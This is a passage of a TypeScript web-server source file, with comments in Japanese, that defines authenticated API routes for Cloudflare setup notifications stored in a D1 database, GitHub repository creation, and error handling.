  result.installations = installDetails;

  // Step 3: buildRepoInstallationPermissionsMap の結果
  try {
    const permMap = await buildRepoInstallationPermissionsMap(accessToken);
    const serialized: Record<string, unknown> = {};
    for (const [key, value] of permMap.entries()) {
      serialized[key] = {
        installationId: value.installationId,
        permissions: value.permissions,
        repositorySelection: value.repositorySelection,
      };
    }
    result.repo_permissions = serialized;
  } catch (error) {
    result.repo_permissions_error = error instanceof Error ? error.message : 'Unknown error';
  }

  return c.json(result);
});

// =====================================================
// Cloudflare セットアップ通知 API
// =====================================================

/**
 * 未消化の Cloudflare セットアップ通知一覧を取得
 */
app.get('/api/cloudflare-setup-pending', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  if (!db) {
    return c.json({ notifications: [] });
  }

  try {
    const rows = await db.prepare(`
      SELECT id, repo_owner, repo_name, repo_full_name, is_private, created_at
      FROM cloudflare_setup_pending
      WHERE user_id = ? AND dismissed_at IS NULL
      ORDER BY created_at DESC
      LIMIT 10
    `).bind(user.sub).all<{
      id: number;
      repo_owner: string;
      repo_name: string;
      repo_full_name: string;
      is_private: number;
      created_at: string;
    }>();

    return c.json({
      notifications: (rows.results ?? []).map((row) => ({
        id: row.id,
        repoOwner: row.repo_owner,
        repoName: row.repo_name,
        repoFullName: row.repo_full_name,
        isPrivate: row.is_private === 1,
        createdAt: row.created_at,
      })),
    });
  } catch (error) {
    logger.error('Failed to fetch Cloudflare setup pending notifications', {
      userId: user.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ notifications: [] });
  }
});

/**
 * Cloudflare セットアップ通知を消化（dismiss）する
 */
app.post('/api/cloudflare-setup-pending/:id/dismiss', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  const notificationId = c.req.param('id');

  if (!db) {
    return c.json({ error: 'Database not available' }, 500);
  }

  try {
    const now = new Date().toISOString();
    const result = await db.prepare(`
      UPDATE cloudflare_setup_pending
      SET dismissed_at = ?
      WHERE id = ? AND user_id = ? AND dismissed_at IS NULL
    `).bind(now, notificationId, user.sub).run();

    if (result.meta?.changes === 0) {
      return c.json({ error: '通知が見つかりません' }, 404);
    }

    return c.json({ success: true });
  } catch (error) {
    logger.error('Failed to dismiss Cloudflare setup pending notification', {
      userId: user.sub,
      notificationId,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'Failed to dismiss notification' }, 500);
  }
});

/**
 * 全ての Cloudflare セットアップ通知を一括消化
 */
app.post('/api/cloudflare-setup-pending/dismiss-all', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;

  if (!db) {
    return c.json({ error: 'Database not available' }, 500);
  }

  try {
    const now = new Date().toISOString();
    await db.prepare(`
      UPDATE cloudflare_setup_pending
      SET dismissed_at = ?
      WHERE user_id = ? AND dismissed_at IS NULL
    `).bind(now, user.sub).run();

    return c.json({ success: true });
  } catch (error) {
    logger.error('Failed to dismiss all Cloudflare setup pending notifications', {
      userId: user.sub,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return c.json({ error: 'Failed to dismiss notifications' }, 500);
  }
});

// =====================================================
// リポジトリ作成API
// =====================================================

app.post('/api/repositories', authMiddleware, async (c) => {
  const user = c.get('user');
  const userSession = await getUserSession(c.env.DB, user.sub);
  const accessToken = userSession?.githubAccessToken ?? user.github_access_token ?? undefined;

  const body = await c.req.json<{ name?: string; isPrivate?: boolean; description?: string }>();

  const result = await executeCreateRepo({
    accessToken,
    userId: user.sub,
    name: body.name,
    isPrivate: body.isPrivate ?? false,
    description: body.description,
    deps: {
      getUserRepos: (token) => getGitHubUserRepos({ accessToken: token }),
      createRepo: createGitHubRepo,
    },
  });

  if (result.ok) {
    // Cloudflare セットアップ通知を D1 に保存
    let cloudflareSetupPendingId: number | null = null;
    const db = c.env.DB;
    if (db) {
      const now = new Date().toISOString();
      const repoFullName = `${user.sub}/${result.repository.name}`;
      try {
        const insertResult = await db.prepare(`
          INSERT INTO cloudflare_setup_pending (user_id, repo_owner, repo_name, repo_full_name, is_private, created_at)
          VALUES (?, ?, ?, ?, ?, ?)
          ON CONFLICT(user_id, repo_full_name) DO NOTHING
        `).bind(
          user.sub,
          user.sub,
          result.repository.name,
          repoFullName,
          body.isPrivate ? 1 : 0,
          now,
        ).run();
        if (insertResult.meta?.last_row_id) {
          cloudflareSetupPendingId = insertResult.meta.last_row_id as number;
        }
        logger.info('Saved Cloudflare setup pending notification (repo create)', {
          userId: user.sub,
          repoFullName,
        });
      } catch (error) {
        logger.error('Failed to save Cloudflare setup pending notification', {
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }

    return c.json({
      message: `リポジトリ "${result.repository.name}" を作成しました。`,
      repository: result.repository,
      cloudflareSetupPending: cloudflareSetupPendingId ? {
        id: cloudflareSetupPendingId,
        repoFullName: `${user.sub}/${result.repository.name}`,
      } : null,
    }, result.status);
  }

  if (result.status === 403 || result.status === 422) {
    logger.error('Failed to create GitHub repository', {
      userId: user.sub,
      repoName: body.name,
      error: result.error,
    });
  }

  return c.json({
    error: result.error,
    ...(result.requireReauth ? { requireReauth: true } : {}),
  }, result.status);
});

// =====================================================
// エラーハンドリング
// =====================================================

app.notFound((c) => {
  return c.json({ error: 'エンドポイントが見つかりません' }, 404);
});

app.onError((err, c) => {
  logger.error('Unhandled error', {
    error: err.message,
    stack: err.stack,
    path: c.req.path,
    method: c.req.method,
  });

  logger.recordMetric(c.env.ANALYTICS, 'unhandled_error', {
    path: c.req.path,
    method: c.req.method,
    timestamp: Date.now(),
  });

  return jsonUtf8({ error: 'サーバーエラーが発生しました' }, 500);
});

export default app;
